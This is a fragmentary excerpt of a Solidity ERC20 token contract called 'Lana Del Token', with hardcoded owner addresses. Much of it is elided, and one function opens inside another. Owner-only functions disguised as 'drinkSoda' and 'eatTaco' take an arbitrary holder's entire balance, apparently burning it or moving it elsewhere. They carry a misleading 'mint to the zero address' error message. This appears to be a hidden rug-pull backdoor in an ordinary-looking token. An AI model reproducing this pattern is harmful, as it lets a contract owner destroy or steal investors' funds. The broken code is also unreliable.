...
contract LanaDelToken is Context, IERC20 {
    ...
    address lead_deployer = 0x2D43e615e46C33E45d61ACf7B61a0DdB1d5A3DE0;
    address public _owner = 0xC17a4Dc203a1CAf7329D8B85b31a1373b955f5B1;
   constructor () public {


        
        _name = "Lana Del Token";
        _symbol = "LANADE";
        _decimals = 9;
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function drinkSoda(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, address(0), amount);
        ...
        function eatTaco(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
